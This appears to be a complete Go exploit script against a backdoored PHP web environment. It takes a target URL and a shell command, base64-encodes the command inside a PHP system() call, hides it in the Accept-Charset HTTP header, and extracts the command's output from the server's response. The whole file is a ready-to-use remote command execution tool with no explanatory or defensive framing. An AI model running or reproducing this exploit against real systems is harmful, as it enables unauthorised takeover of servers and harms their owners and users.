package main

import (
	_"compress/gzip"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"

)

func main() {
	evalcmd := os.Args[2]
	evalfunc := "echo '<result>\r\n\r\n';system(\"chcp 65001 && " + evalcmd + "\");echo '\r\n</result>';"
	encodeString := base64.StdEncoding.EncodeToString([]byte(evalfunc))
	attack_Domain := os.Args[1]
	req, _ := http.NewRequest("GET", attack_Domain, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Accept-Charset", encodeString)
	req.Header.Set("Accept-Encoding", "gzip,deflate")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		fmt.Println("error")
	}
	body, err := ioutil.ReadAll(resp.Body)
	reg := regexp.MustCompile(`<result>(?s:(.*?))</result>`)
	if reg == nil {
		fmt.Println("正则匹配失败")
		return
	}
	str := string(body)
	result := reg.FindAllStringSubmatch(str,-1)
	for _, text := range result {
		fmt.Println(text[1])
	}
}